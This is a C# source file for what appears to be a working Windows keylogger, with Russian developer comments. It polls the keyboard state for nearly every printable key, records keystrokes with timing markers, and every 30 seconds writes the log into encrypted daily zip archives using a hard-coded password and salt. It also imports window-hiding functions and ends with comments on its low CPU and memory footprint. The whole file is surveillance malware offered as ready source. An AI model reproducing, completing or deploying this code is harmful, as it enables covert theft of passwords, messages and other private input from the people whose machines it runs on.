// Encoding: UTF-8
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Foo
{
  static class Application
  {
    static string keys_buffer = "";
    static ICollection<Keys> pressed_keys = new SortedSet<Keys>();
    static ICollection<Keys> scanned_key_set;
    static Dictionary<Keys, string> keys_to_str;
    static DateTime last_key_pressed_time = new DateTime(0);

    const string password = "(\x23, \x12, \x19\x94)";
    static readonly byte[] salt = Encoding.UTF8.GetBytes("fb$UWvZmTQ");

    static TimeSpan one_hour = new TimeSpan(TimeSpan.TicksPerHour);
    static TimeSpan one_minute = new TimeSpan(TimeSpan.TicksPerMinute);
    static TimeSpan two_seconds = new TimeSpan(TimeSpan.TicksPerSecond * 2);
    static TimeSpan one_second = new TimeSpan(TimeSpan.TicksPerSecond);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int cmdShow);

    [DllImport("user32.dll")]
    static extern short GetKeyState(Keys k);

    static void SaveToZip(string archive_filename, string text_filename)
    {
      if (keys_buffer.Count() == 0)
      {
#if DEBUG
        Console.WriteLine("Нечего сохранять. {0}", text_filename);
#endif
        return;
      }

#if DEBUG
      Console.WriteLine("Добавление файла {0} в архив {1} ...",
        text_filename, archive_filename);
#endif

      byte[] keys_bytes = Encoding.UTF8.GetBytes(keys_buffer);

      using (ZipArchive archive = ZipFile.Open
        (archive_filename, ZipArchiveMode.Update))
      {
        ZipArchiveEntry entry = archive.CreateEntry
          (text_filename, CompressionLevel.Optimal);

        using (Stream file_stream = entry.Open())
        {
          using (MemoryStream byte_stream = new MemoryStream(keys_bytes))
          {
            Foo.Cryptography.EncryptData(byte_stream, file_stream, password, salt);
          }
        }
      }

      keys_buffer = "";
    }

    static string Interval()
    {
      TimeSpan silent_time_interval = DateTime.Now - last_key_pressed_time;

      if (silent_time_interval < TimeSpan.Zero ||
          silent_time_interval > one_hour)
      {
        return string.Format("\r\n<{0}>\r\n", DateTime.Now);
      }

      if (silent_time_interval > one_minute)
      {
        return "\r\n";
      }

      if (silent_time_interval > two_seconds)
      {
        return "  ";
      }

      if (silent_time_interval > one_second)
      {
        return " ";
      }

      return "";
    }

    static string ToString(Keys k)
    {
      if (k >= Keys.A && k <= Keys.Z)
      {
        return (char)((int)(k - Keys.A) + (int)'A') + "";
      }

      if (k >= Keys.D0 && k <= Keys.D9)
      {
        return (char)((int)(k - Keys.D0) + (int)'0') + "";
      }

      if (k >= Keys.NumPad0 && k <= Keys.NumPad9)
      {
        return (char)((int)(k - Keys.NumPad0) + (int)'0') + "";
      }

      try
      {
        return keys_to_str[k];
      }
      catch
      {
        return "<" + ((int)k).ToString() + ">";
      }
    }

    static bool IsPressed(Keys k)
    {
      return GetKeyState(k) < 0;
    }

    static void ScanKeyboard()
    {
      bool is_any_key_pressed = false;

      foreach (Keys k in scanned_key_set)
      {
        if (IsPressed(k))
        {
          if (!pressed_keys.Any(c => c == k))
          {
            keys_buffer += Interval() + ToString(k);
            pressed_keys.Add(k);
          }

          is_any_key_pressed = true;
        }
        else
        {
          pressed_keys.Remove(k);
        }
      }

      if (is_any_key_pressed)
      {
        last_key_pressed_time = DateTime.Now;
      }
    }

    static void InitializeKeys()
    {
      // нажатия из chrome в виртуалке ловятся?
      // нажатия из хоста не ловятся
      scanned_key_set = new List<Keys>()
      {
        // Буквы и цифры
        Keys.A,
        Keys.B,
        Keys.C,
        Keys.D,
        Keys.E,
        Keys.F,
        Keys.G,
        Keys.H,
        Keys.I,
        Keys.J,
        Keys.K,
        Keys.L,
        Keys.M,
        Keys.N,
        Keys.O,
        Keys.P,
        Keys.Q,
        Keys.R,
        Keys.S,
        Keys.T,
        Keys.U,
        Keys.V,
        Keys.W,
        Keys.X,
        Keys.Y,
        Keys.Z,
        Keys.D0,
        Keys.D1,
        Keys.D2,
        Keys.D3,
        Keys.D4,
        Keys.D5,
        Keys.D6,
        Keys.D7,
        Keys.D8,
        Keys.D9,

        // Другие печатные символы. Слева-направо сверху-вниз по PC/AT.
        Keys.Oemtilde,
        (Keys)189,
        (Keys)187,
        Keys.OemPipe,
        Keys.Back,
        Keys.Tab,
        Keys.OemOpenBrackets,
        Keys.OemCloseBrackets,
        Keys.Enter,
        (Keys)20,
        Keys.OemSemicolon,
        Keys.OemQuotes,
        Keys.ShiftKey,
        Keys.Oemcomma,
        Keys.OemPeriod,
        (Keys)191,
        Keys.Space,

        // Numric Keypad
        Keys.NumPad0,
        Keys.NumPad1,
        Keys.NumPad2,
        Keys.NumPad3,
        Keys.NumPad4,
        Keys.NumPad5,
        Keys.NumPad6,
        Keys.NumPad7,
        Keys.NumPad8,
        Keys.NumPad9,
        Keys.Add,
        Keys.Subtract,
        Keys.Multiply,
        Keys.Divide,

        // Прочие
        Keys.Escape,
      };

      scanned_key_set = scanned_key_set.OrderBy(x => x).ToList();

      keys_to_str = new Dictionary<Keys, string>()
      {
        {Keys.Oemtilde, "`"},
        {(Keys)189, "-"},
        {(Keys)187, "="},
        {Keys.OemPipe, "\\"},
        {Keys.Back, "<Back>"},
        {Keys.Tab, "<Tab>"},
        {Keys.OemOpenBrackets, "["},
        {Keys.OemCloseBrackets, "]"},
        {Keys.Enter, "<Enter>"},
        {(Keys)20, "<Caps Lock>"},
        {Keys.OemSemicolon, ";"},
        {Keys.OemQuotes, "'"},
        {Keys.ShiftKey, "<Shift>"},
        {Keys.Oemcomma, ","},
        {Keys.OemPeriod, "."},
        {(Keys)191, "/"},
        {Keys.Space, "<Space>"},

        {Keys.Add, "+"},
        {Keys.Subtract, "-"},
        {Keys.Multiply, "*"},
        {Keys.Divide, "/"},

        {Keys.Escape, "<Esc>"},
      };
    }

    static void Main()
    {
      InitializeKeys();

#if DEBUG
      foreach (Keys k in scanned_key_set)
      {
        Console.WriteLine("{0} {1}", (int)k, ToString(k));
      }
#endif

      const string logs_dir = "logs/";

      if (!Directory.Exists(logs_dir))
      {
        Directory.CreateDirectory(logs_dir);
      }

      const int sleep_ms = 0;
      const long TICKS_PER_SECOND = TimeSpan.TicksPerSecond;
      const int max_buffer_count = 4096 - 14;

      while (true)
      {
        long last_save_tick = DateTime.Now.Ticks;
#if DEBUG
        Console.WriteLine("last_save_tick = {0}", last_save_tick);
#endif

        do
        {
          Thread.Sleep(sleep_ms);
          ScanKeyboard();
        } while (keys_buffer.Count() < max_buffer_count
          && DateTime.Now.Ticks - last_save_tick < TICKS_PER_SECOND * 30);

        SaveToZip(logs_dir + DateTime.Now.ToString("yyyy_MM_dd") + ".zip",
          DateTime.Now.ToString("hh_mm_ss") + ".txt");
      }
    }
  }
}
// ЦП 0%
// Память 6 МБ
